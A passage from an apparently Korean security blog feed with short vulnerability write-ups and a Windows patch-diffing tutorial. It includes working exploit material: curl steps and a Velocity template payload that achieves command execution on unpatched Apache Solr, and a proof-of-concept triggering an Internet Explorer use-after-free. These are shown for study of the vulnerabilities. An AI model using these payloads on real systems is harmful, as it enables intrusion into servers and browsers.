    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/Imanfeng/Apache-Solr-RCE#cve-2020-13957">CVE-2020-13957: Apache Solr ConfigSet RCE Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Apache Solr 6.6.0-6.6.5<br>Apache Solr 7.0.0-7.7.3<br>Apache Solr 8.0.0-8.6.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apache Solr는 Apache Lucene을 기반으로 만들어진 검색 엔진입니다. 사용자는 특정 형식의 XML 파일을 서버에 업로드하여 인덱스를 생성하거나 검색 요청을 하여 결과를 XML 형식으로 얻을 수 있습니다.</p><p>이러한 Solr의 ConfigSet API 에 unauthrization config upload 가 가능해 RCE까지 이어질 수 있는 취약점이 발견되었습니다.</p><p>사용자는 ConfigSet API를 사용해 configset을 업로드하고 logical index를 구성하는 컬렉션을 생성할 수 있습니다. 이 때 원격 코드 실행에 악용될 수 있는 일부 기능들을 필터링해 악성 컬렉션이 구성되는 것을 방지합니다. 그러나 <code>configset.upload.enabled</code> 옵션이 true로 설정되어 있으면 이를 UPLOAD 와 CREATE 로 우회할 수 있습니다.</p><ol><li><p>먼저 악성 configset을 포함하는 압축 파일을 UPLOAD 합니다. </p> <pre><code class="hljs jsx">curl -X POST --header <span class="hljs-string">&quot;Content-Type:application/octet-stream&quot;</span>--data-binary@<span class="hljs-number">7.</span>zip <span class="hljs-string">&quot;http://[host]/solr/admin/configs?action=UPLOAD&amp;name=file1&quot;</span></code></pre></li><li><p>CREATE는 기존 configset을 기반으로 새로운 configset을 작성할 수 있습니다. 이를 이용해 UPLOAD된 configset을 기반으로 새로운 configset을 만들면 악용 가능한 기능들을 필터링을 하지 않아 인증 검사 로직을 우회할 수 있습니다.</p> <pre><code class="hljs jsx">curl <span class="hljs-string">&quot;http://[host]/solr/admin/configs?action=CREATE&amp;name=file3&amp;baseConfigSet=file1&amp;configSetProp.immutable=false&amp;wt=xml&amp;omitHeader=true&quot;</span></code></pre></li><li><p>2에서 얻은 새로운 configset를 기반으로 악성 컬렉션을 생성합니다.</p> <pre><code class="hljs jsx">curl <span class="hljs-string">&quot;http://[host]/solr/admin/collections?action=CREATE&amp;numShards=1&amp;name=file2&amp;collection.configName=file3&quot;</span></code></pre></li><li><p>생성된 악성 컬렉션은 원격 코드 실행에 사용할 수 있습니다.</p> <pre><code class="hljs jsx">http:<span class="hljs-comment">//[host]/solr/newCollection3/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=&#x27;&#x27;)+%23set($rt=$x.class.forName(&#x27;java.lang.Runtime&#x27;))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end&quot;</span></code></pre></li></ol><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.secpulse.com/archives/144081.html">https://www.secpulse.com/archives/144081.html</a></p><p><a href="https://issues.apache.org/jira/browse/SOLR-14925">https://issues.apache.org/jira/browse/SOLR-14925</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>apache solr</tag>
      
      <tag>unauthrization upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-17053: Internet Explorer UAF 취약점</title>
    <link href="/2020/11/19/idioth/2020-11-19/"/>
    <url>/2020/11/19/idioth/2020-11-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trendmicro.com/en_us/research/20/k/cve-2020-17053-use-after-free-ie-vulnerability.html">CVE-2020-17053: Use-After-Free IE Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Internet Explorer</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Internet Explorer에서 neutering ArrayBuffer로 인한 use after free 취약점이 발견되었습니다. 해당 취약점은 CVE-2020-1380과 비슷한 취약점이지만 JIT 엔진 없이 트리거할 수 있습니다.</p><p>JIT 엔진을 사용하지 않고 item을 TypedArray로 변환할 때 <em>jscript.dll</em>은 interpreter에서 다음과 같은 작업을 수행합니다.</p><ol><li><code>Js::JavascriptConversion::ToNumber()</code> 호출</li><li>TypedArray의 ArrayBuffer가 detach 되었는지 확인</li><li>변환할 element의 index와 TypedArray의 길이 비교</li><li><code>Js::JavascriptConversion::ToNumber()</code>를 다시 호출하여 ArrayBuffer로 값 설정</li></ol><p><code>Js::JavascriptConversion::ToNumber()</code>의 첫 번째 호출에서 해커는 callback 함수를 통해 TypedArray의 ArrayBuffer를 free 할 수 있고 uaf를 발생시킬 수 있습니다. 이것을 막기 위해 첫 번째 호출 후 ArrayBuffer가 detach 되었는지 확인하여 user code callback에서 메모리가 free 되는 것을 방지합니다. 하지만 두 번째 호출에서는 별다른 검사를 하지 않기 때문에 이를 악용하여 uaf를 발생시킬 수 있습니다.</p><details><summary>POC Code</summary><p><pre><code class="hljs js"><span class="hljs-keyword">var</span> arr = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float32Array</span>(<span class="hljs-number">0x100</span>);<span class="hljs-keyword">var</span> flag = <span class="hljs-number">0</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">index, value</span>) </span>&#123;    arr[index] = value;&#125;<span class="hljs-keyword">var</span> obj = &#123;&#125;;obj.valueOf = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">if</span>(flag == <span class="hljs-number">1</span>) &#123;        worker = <span class="hljs-keyword">new</span> Worker(<span class="hljs-string">&quot;&quot;</span>);        worker.onmessage = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;&#125;;        worker.postMessage(<span class="hljs-number">0</span>, [arr.buffer]);        worker.terminate();        worker = <span class="hljs-literal">null</span>;        <span class="hljs-keyword">var</span> start = <span class="hljs-built_in">Date</span>.now();        <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Date</span>.now() - start &lt; <span class="hljs-number">200</span>) &#123;&#125;        <span class="hljs-keyword">return</span> <span class="hljs-number">0x1337</span>;    &#125;    flag = <span class="hljs-number">1</span>;&#125;;pwn(<span class="hljs-number">0</span>, obj);</code></pre></p></details><p>두 번째 인자를 <code>obj</code>로 <code>pwn</code> 함수를 호출하면 item을 TypedArray로 변환할 때 <code>Js::JavascriptConversion::ToNumber()</code>가 호출되어 callback 함수가 두 번 호출됩니다. 첫 번째 호출에는 <code>flag == 0</code>이므로 ArrayBuffer가 neutering 되지 않지만 두 번째 호출에서 ArrayBuffer가 neutering 됩니다. 두 번째 호출에서는 ArrayBuffer가 detach 되었는지 검사하지 않으므로 uaf가 발생합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>use after free</tag>
      
      <tag>idioth</tag>
      
      <tag>internet explorer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-15647: website stealing files from device</title>
    <link href="/2020/11/18/fabu1ous/2020-11-18/"/>
    <url>/2020/11/18/fabu1ous/2020-11-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/@kanytu/firefox-and-how-a-website-could-steal-all-of-your-cookies-581fe4648e8d">Firefox: How a website could steal all your cookies</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Firefox Fennec v68.9.0</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Firefox Fennec에서 Arbitrary local file access 취약점(CVE-2020–15647)이 발견되었습니다. 이를 악용한 해커의 웹 사이트에 접속하면 핸드폰의 파일을 탈취당할 수 있습니다.</p><p>안드로이드용 <code>Firefox Content Provider</code>의 misconfigure로 인해 발생하는 취약점으로 Firefox에서 접근할 수 있는 모든 파일을 웹페이지가 읽을 수 있고 해커의 웹 서버로 내용을 전송할 수 있습니다. 취약점이 발생하는 이유는 다음과 같습니다.</p><ol><li><code>content://</code> URI로 파일을 열면 파일명을 바꾸지 않고 cache 한 뒤 그곳으로 redirect 합니다.</li><li><a href="https://developer.android.com/training/secure-file-sharing/setup-sharing">file content provider</a>의 공유 가능 디렉터리가 root-path로 설정돼있습니다.</li></ol><p>브라우저는 로컬 html 파일을 열 때 <code>content://</code> URI를 사용합니다. victim device에서 탈취하고자 하는 파일(이하 target)과 동일한 이름의 악성 html 파일을 업로드하고 실행하면 Firefox가 파일명을 유지한 채로 cache 합니다. 악성 html 파일은 브라우저가 target을 <code>content://</code>로 열게 하고 기존에 cache 된 파일이 target의 내용으로 overwrite 됩니다. 악성 html이 이를 파싱해 해커의 웹 서버로 전송할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>android</tag>
      
      <tag>firefox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Samsung Neural Processing Unit memory corruption in shared memory parsing</title>
    <link href="/2020/11/17/l0ch/2020-11-17/"/>
    <url>/2020/11/17/l0ch/2020-11-17/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2073">Samsung NPU (Neural Processing Unit) memory corruption in shared memory parsing</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Samsung’s Exynos-based devices (including Neural Processing Unit)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>삼성의 엑시노스 모바일 프로세서에 포함된 NPU(Neural Processing Unit)는 머신러닝 연산에 사용됩니다. 이러한 NPU의 Neural Network Feature Maps를 패키징하는데 사용되는 <code>NCP</code> 구조체의 입력 값 검증을 하지 않아 memory corruption이 발생하는 취약점이 발견되었습니다.</p><p>Convolution Neural Network Feature Maps(IFM / OFM)을 패키징하는 <code>npu_session_s_graph</code> 에서는 먼저<code>__get_session_info</code> 를 호출해 사용자 영역 ION 메모리 버퍼를 커널 메모리에 매핑합니다.</p><blockquote><p>ION - process 간 메모리 공유를 위한 메모리 할당자</p></blockquote><p>그리고 <code>__config_sesison_info</code>를 호출해 매핑된 메모리를 파싱하는데, 아래와 같은 과정에서 취약점을 트리거할 수 있습니다.</p><ol><li><code>__pilot_parsing_ncp</code> 에서 <code>temp_IFM_av</code> 버퍼의 크기는 사용자 영역 공유 메모리에서 가져온  <code>ncp-&gt; memory_vector_cnt</code> 을 사용해 먼저 계산됩니다.</li><li>TOCTOU 버그를 트리거해 사용자 영역에서 <code>ncp-&gt; memory_vector_cnt</code> 의 값을 더 큰 값으로 변경합니다.</li><li>이후 <code>__second_parsing_ncp</code> 에서 <code>ncp-&gt; memory_vector_cnt</code> 를 다시 읽어 <code>temp_IFM_av</code> 버퍼에 복사합니다.</li><li>2단계에서 큰 값으로 변경된 <code>ncp-&gt; memory_vector_cnt</code> 로 인해 <code>temp_IFM_av</code> 버퍼의 사이즈보다 더 많은 값을 복사하게 되고 이때 bounds check를 하지 않아 heap buffer overflow가 발생합니다.</li></ol><p>해당 취약점을 이용하면 커널 스레드 스택을 포함해 vmap의 커널 버퍼 범위를 벗어나 데이터를 쓸 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>toctou</tag>
      
      <tag>samsung</tag>
      
      <tag>L0ch</tag>
      
      <tag>npu</tag>
      
      <tag>neural processing unit</tag>
      
      <tag>heap buffer overflow</tag>
      
      <tag>exynos</tag>
      
      <tag>shared memory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Two Privilege Escalation Vulnerability in Ivanti Unified Endpoint Manager</title>
    <link href="/2020/11/16/idioth/2020-11-16/"/>
    <url>/2020/11/16/idioth/2020-11-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.jumpsec.com/detecting-known-dll-hijacking-and-named-pipe-token-impersonation-attacks-with-sysmon/">Detecting known DLL hijacking and named pipe token impersonation attacks with Sysmon</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Ivanti Unified Endpoint Manager &lt;= 2020.1.1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><strong>CVE-2020-13770: Named pipe token impersonation</strong></p><p>해당 취약점은 프로세스가 named pipe object를 열 때 보안 attribute가 부적절하여 발생한 취약점입니다. </p><p><code>CreateFile</code>의 <code>dwFlagsAndAttributes</code> 인자가 아래와 같은 attribute일 때 취약점이 발생합니다.</p><ul><li>SECURITY_DELEGATION</li><li>SECURITY_IMPERSONATION</li></ul><p>위의 두 attribute 중 하나로 named pipe를 열면 서버는 클라이언트 토큰을 얻고 추후 access check에 사용합니다. pipe 서버는 pipe 클라이언트의 권한, security context 등을 사용할 수 있으므로 서버보다 클라이언트의 권한이 높으면 서버는 권한 상승을 할 수 있습니다.</p><p><strong>CVE-2020-13771: DLL search order hijacking</strong></p><p>해당 취약점은 윈도우의 <a href="https://docs.microsoft.com/ko-kr/windows/win32/dlls/dynamic-link-library-search-order">DLL Search Order</a>를 이용한 취약점입니다. <code>SafeDllSearchMode</code> 설정에 관계없이 프로세스가 DLL 파일을 찾지 못하면 환경 변수 PATH에서 파일을 찾습니다. 해커가 환경 변수에 등록된 폴더에 조작된 DLL 파일을 배치하면 취약한 프로세스가 해당 DLL을 로드하고 그 프로세스의 context로 <code>DllMain</code>이 실행되어 권한상승을 할 수 있습니다. 해당 프로그램에서 악용할 수 있는 dll 파일은 아래와 같습니다.</p><ul><li>ldprofileui.dll</li><li>wfapi.dll</li><li>DMIAPI32.DLL</li><li>logonsrv.dll</li><li>OOBCredentials.dll</li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>lpe</tag>
      
      <tag>named pipe</tag>
      
      <tag>dll hijacking</tag>
      
      <tag>idioth</tag>
      
      <tag>dll search order</tag>
      
      <tag>impersonation attack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Windows Patch Diffing 맛보기 Part 1</title>
    <link href="/2020/11/15/l0ch/windows-patch-diffing-part1/"/>
    <url>/2020/11/15/l0ch/windows-patch-diffing-part1/</url>
    
    <content type="html"><![CDATA[<p>안녕하세요! L0ch입니다. 저번 <a href="https://hackyboiz.github.io/2020/11/01/l0ch/cve-2020-1464/">GlueBall 취약점</a> 글 썼을 때 디핑 할 버전별 바이너리를 구하다가 멘탈이 파쇄기에 갈린 종이마냥 갈릴 뻔했죠?</p><p>생각해보니까 괜히 Diffing 하겠다고 건드렸다가 X고생했는데 이대로 가만히 있으면 왠지 억울하자나여. 그래서 이 참에 좀 쉽게 쉽게 갈 수 있는 방법을 찾느라 방황하던 중 엄청난 글을 발견하게 되는데..</p><p><a href="https://wumb0.in/extracting-and-diffing-ms-patches-in-2020.html">Extracting and Diffing Windows Patches in 2020</a></p><p>이거 완전 나를 위한 글이잖아??ㅎ</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/1.png"></p><p>그래서! 바로 정리에 들어갔죠. 앞으로 할 삽질은 꿈에도 모른 채 ㅋㅋ 아</p><h1 id="Diffing-이-뭔데"><a href="#Diffing-이-뭔데" class="headerlink" title="Diffing 이 뭔데?"></a>Diffing 이 뭔데?</h1><p>간단하게 Binary Diffing이 뭔지 짚고 넘어가 봅시다!</p><blockquote><p>Diffing 은 일반적으로 컴퓨터에서 두 개 파일의 차이를 보여주는 용어다. (Ex : git diff - Git의 소스코드 difference 확인) 바이너리 분석 기법(Binary Diffing)으로도 쓰이는데, 패치 또는 업데이트된 바이너리와 기존 바이너리를 비교해서 어떤 코드가 변경되었는지, 어떤 함수가 추가되고 제거되었는지 등 버전 별 바이너리의 차이점을 알 수 있는 분석 기법이다.</p></blockquote><p>한마디로 얘네가 뭐를 어떻게 패치했나~ 바뀐 부분만 쓱 둘러보는 분석 기법입니다. 별 거 없어 보이지만 Diffing을 하면서 패치로 인해 발생한 새로운 취약점이나, 기존 취약점에 대해 적용한 패치를 우회하는 새로운 방법 등을 효율적으로 찾을 수 있습니다. 오늘은 앞서 말한 것처럼 Windows Update 패치를 추출하고 추출한 업데이트 파일을 이용해 Diffing을 진행해 볼게요.</p><h1 id="Windows-Update-Package"><a href="#Windows-Update-Package" class="headerlink" title="Windows Update Package"></a>Windows Update Package</h1><h2 id="Microsoft-Update-Catalog"><a href="#Microsoft-Update-Catalog" class="headerlink" title="Microsoft Update Catalog"></a>Microsoft Update Catalog</h2><p>윈도우는 업데이트 패키지를 배포해 실행하는 방식으로 패치를 합니다.</p><p>Windows 10 기준으로 버전 별로 나누어 배포하고 있으며 오늘은 다음 환경에서 진행합니다.</p><pre><code class="hljs markdown">Windows 10 ver1903, 64bit</code></pre><p>버전에 따라 받아야 하는 업데이트 파일이 다르니 참고하시면 됩니다!</p><p>기본적으로 윈도우는 자동 업데이트 방식을 사용하지만 윈도우 카탈로그에서 독립 실행형 패치 패키지를 받아 수동 설치할 수도 있습니다.</p><p>윈도우 카탈로그 : <a href="https://www.catalog.update.microsoft.com/Home.aspx">https://www.catalog.update.microsoft.com/Home.aspx</a></p><p>Windows 카탈로그는 다음과 같은 형식의 검색 기능을 제공합니다.</p><pre><code class="hljs lisp">YYYY-MM release-number (<span class="hljs-name">x86</span><span class="hljs-name">|x64|</span><span class="hljs-name">ARM64</span>) cumulative</code></pre><p>제 윈도우는 1903, 64bit 이므로 8월 업데이트를 찾기 위해 아래 키워드로 검색을 해볼게요.</p><pre><code class="hljs angelscript"><span class="hljs-number">2020</span><span class="hljs-number">-08</span> <span class="hljs-number">1903</span> x64 cumulative</code></pre><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/2.png"></p><p>검색을 하면 이렇게 업데이트 목록들이 주르륵 뜨는데, Diffing 하길 원하는 파일이 패치된 업데이트 항목을 받으면 됩니다. 전 <code>KB4565351</code> 을 받도록 할게요.</p><h1 id="Extract-Update-Package"><a href="#Extract-Update-Package" class="headerlink" title="Extract Update Package"></a>Extract Update Package</h1><p>업데이트 파일을 다운로드하면 <code>msu</code> 확장명의 업데이트 패키지를 받을 수 있습니다.</p><p>이 패키지에서 파일들을 추출해내면 됩니다.</p><h2 id="Extract-msi"><a href="#Extract-msi" class="headerlink" title="Extract msi"></a>Extract msi</h2><p>PowerShell에서 <code>expand.exe -F:* &quot;[msu file name]&quot; .\\ext\\</code> 명령어로 패치 컨텐츠들을 추출하면 아래 사진과 같이 ext 폴더 안에 추출된 파일들이 있는 걸 볼 수 있습니다~</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/3.png"></p><p>cab파일이 보이는군요, 이것도  역시 expand로 쓱싹 추출하도록 하죠!</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/4.png"></p><p>..?? 왜 아무 반응이 없지..?</p><p>아 왜 안되나 했더니 좀 오래 걸리나 보군요 기다려 봅시다 ㅎ</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/5.png"></p><p>그렇게 <del>2000년 같은</del> 한 시간이 지나고.. 한 20분 정도 기다리다가 포기하고 저녁 먹고 오니까 끝나 있네요?</p><p>아니 뭐 추출 얼마나 한다고 이렇게 오래 걸리냐 하고 추출한 파일 개수를 세 봤는데</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/6.png"></p><p>?? 3만개요?</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/7.png"></p><p><em>아니 미친 ㅎㅎ</em></p><p>누적 업데이트 패키지라 지금까지의 업데이트들이 모두 포함되어 있어 이렇게 많다고 하네요…? 추출은 밥때 맞춰서 돌려놓고 밥 먹고 오면 될 것 같습니다ㅋㅋ;</p><h2 id="Extracted-files"><a href="#Extracted-files" class="headerlink" title="Extracted files"></a>Extracted files</h2><p><code>tree /F &gt;&gt; extract.txt</code> 명령어로 어떤 파일들이 추출 되었는지 트리 구조로 확인해 보도록 하죠!</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/8.png"></p><p>다양한 형식의 파일, 폴더들이 추출된 것을 볼 수 있네요.</p><ol><li><p>폴더 유형</p><p>접두어로 아키텍처가 붙음</p><ul><li>amd64, x86, wow64, msil</li></ul></li><li><p>파일 유형</p><ul><li>manie</li><li>cat : 보안 카탈로그</li><li>mum : 카탈로그 파일과 쌍을 이루며 메타 데이터가 포함됨</li></ul></li></ol><p>그런데.. 각 패치 폴더 안에 f랑 r 폴더가 있고, 이 안에 각각 같은 이름의 바이너리가 보이는데, 이게 뭘까요..?</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/9.png"></p><p>f, r 각 폴더는 Differential 폴더로, 세 가지 유형이 있습니다.</p><ul><li>f: forward differential</li><li>r: reverse differential</li><li>n: null differential</li></ul><p>이들은 기본 버전에서 변경될 업데이트 파일과의 차이만큼의 내용을 담고 있는 파일입니다. 이 부분은 중요한 내용이라 나중에 다시 짚어 보도록 할 테니, 꼭 기억해 두세요!</p><h2 id="WinSxS"><a href="#WinSxS" class="headerlink" title="WinSxS"></a>WinSxS</h2><p>Windows는 Windows와 WinSxS를 통해 바이너리뿐만 아니라 모든 종류의 파일을 업데이트할 수 있습니다.</p><p>WinSxS는 manifest를 참조해 패치하며 manifest에는 패치 적용 방법, 결과 파일의 권한, 설정할 레지스트리 키 등 업데이트에 대한 전반적인 리스트 정보가 있어요. 간단하게 확인해 볼까요?</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/10.png"></p><p>Windows-Gaming-XboxLive-Storage-Service-Component에 대한 manifest 정보를 조회한 결과입니다.</p><p>differential 폴더인 f, r가 있고, 각각에 패치될 dll과 exe 바이너리가 있는 걸 확인할 수 있어요.</p><h1 id="추출-자동화"><a href="#추출-자동화" class="headerlink" title="추출 자동화"></a>추출 자동화</h1><p>그런데 말입니다. 다 좋은데.. 추출한 파일 리스트를 좀 보려고 했더니 아키텍처 별로 분류도 없고 뒤죽박죽 개판이라 짜증 나려고 하네,,^^</p><blockquote><p>날로 먹기 좋아하는 L0ch는 바로 추출/분류 자동화 스크립트를 짜기로 합니다. 역시 원 게시글에도 스크립트가 있군요!<br>기쁜 표정으로 스크립트를 살펴본 L0ch의 표정이 어두워집니다. 무슨 일이죠? 아 ! 파워쉘로 짠 스크립트네요!<br>저런… 애석하게도 L0ch는 파워쉘을 해본 적이 없습니다. 눈물을 머금고 파이썬으로 새로 작성하는 방법밖에 없겠군요.</p></blockquote><pre><code class="hljs python"><span class="hljs-comment">#F**k PowerShell </span><span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> subprocess<span class="hljs-keyword">import</span> timeps_path = <span class="hljs-string">&#x27;C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe &#x27;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_dir</span>(<span class="hljs-params">dir</span>):</span><span class="hljs-keyword">try</span>:<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span>(os.path.isdir(dir)):os.makedirs(os.path.join(dir))<span class="hljs-keyword">except</span> OSError <span class="hljs-keyword">as</span> e:<span class="hljs-keyword">if</span> e.errno != errno.EEXIST:print(<span class="hljs-string">&quot;Failed to create directory&quot;</span>)<span class="hljs-keyword">raise</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extract_msu</span>():</span>cmd = <span class="hljs-string">&#x27;expand.exe -F:* &quot;*.msu&quot; ./ext/&#x27;</span>subprocess.run(ps_path + cmd, shell=<span class="hljs-literal">True</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extract_cab</span>():</span>cmd = <span class="hljs-string">&#x27;expand.exe -F:* &quot;./ext/Windows*.cab&quot; ./patch/&#x27;</span>subprocess.run(ps_path + cmd, shell=<span class="hljs-literal">True</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">move_files</span>(<span class="hljs-params">dir, filename</span>):</span><span class="hljs-keyword">try</span>:os.popen(<span class="hljs-string">&#x27;move ./patch/&#x27;</span>+filename+<span class="hljs-string">&#x27; ./&#x27;</span>+dir)<span class="hljs-keyword">except</span>:print(<span class="hljs-string">&quot;Failed to move file&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">classification</span>():</span>output = os.popen(<span class="hljs-string">&#x27;dir /ad /b patch&#x27;</span>).read()patch_list = output.split(<span class="hljs-string">&#x27;\\n&#x27;</span>)print(<span class="hljs-string">&quot;File classification&quot;</span>)<span class="hljs-keyword">for</span> idx, patch <span class="hljs-keyword">in</span> enumerate(patch_list):<span class="hljs-keyword">if</span> idx + <span class="hljs-number">1</span> % <span class="hljs-number">5</span> == <span class="hljs-number">0</span>:print(<span class="hljs-string">&quot;(&quot;</span>+str(idx)+<span class="hljs-string">&quot;/&quot;</span> + str(len(patch_list))+<span class="hljs-string">&quot;)&quot;</span>)time.sleep(<span class="hljs-number">0.01</span>)platform = patch[:<span class="hljs-number">5</span>]<span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;msil&#x27;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&#x27;MSIL&#x27;</span>, patch)<span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;wow64&#x27;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&#x27;WOW64&#x27;</span>, patch)<span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;amd64&#x27;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&#x27;x64&#x27;</span>, patch)<span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;x86&#x27;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&#x27;x86&#x27;</span>, patch)print(<span class="hljs-string">&quot;(&quot;</span>+str(idx + <span class="hljs-number">1</span>)+<span class="hljs-string">&quot;/&quot;</span> + str(len(patch_list))+<span class="hljs-string">&quot;)&quot;</span>)<span class="hljs-comment"># JUNK</span>os.popen(<span class="hljs-string">&#x27;move patch JUNK&#x27;</span>)os.popen(<span class="hljs-string">&#x27;cd ext &amp;&amp; move *.txt ../&#x27;</span>)os.popen(<span class="hljs-string">&#x27;echo y | rmdir /s ext &gt; nul&#x27;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:dir_list = [<span class="hljs-string">&#x27;ext&#x27;</span>,<span class="hljs-string">&#x27;patch&#x27;</span>,<span class="hljs-string">&#x27;MSIL&#x27;</span>,<span class="hljs-string">&#x27;WOW64&#x27;</span>,<span class="hljs-string">&#x27;x64&#x27;</span>,<span class="hljs-string">&#x27;x86&#x27;</span>]<span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> dir_list:create_dir(d)extract_msu()extract_cab()classification()print(<span class="hljs-string">&quot;Done&quot;</span>)time.sleep(<span class="hljs-number">3</span>)</code></pre><p>PowerShell 써보려고 했는데 10분만에 때려치고 걍 익숙한 파이썬 썼습니다ㅋㅋ. 익숙한 게 최고야</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/11.png"></p><blockquote><p>파이썬 최고다악!! </p></blockquote><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/12.png"></p><p>msu에서 cab파일을 추출하고, 위 사진과 같이 cab에서 추출한 파일들을 각 아키텍처 폴더에 분류했습니다.<br>.manifest와 .mum, .cat 파일은 들여다볼 일이 거의 없기 때문에 JUNK로 분류를 했구요.</p><p>이렇게 분류해서 정리된 모습을 보니 편안하군요. 역시 사람은 정리를 하고 살아야 돼<br>아 그래서 제 방은 정리하고 사냐구요? 그럴 리가요..?</p><p>분량 조절 실패로.. 다음 글에서는 패치 유형을 알아보고, 본격적으로 Diffing을 해볼게요!</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/13.jpg"></p><p>안녕히 계세요 여러분! 전 이 세상의 모든 굴레와 속박을 벗어 던지고 제 행복을 찾아 떠납니다! (대충 술 먹으러 간다는 말)</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>diffing</tag>
      
      <tag>patch tuesday</tag>
      
      <tag>patch extract</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Software-based Power Side-Channel Attack on x86</title>
    <link href="/2020/11/14/fabu1ous/2020-11-14/"/>
    <url>/2020/11/14/fabu1ous/2020-11-14/</url>
    
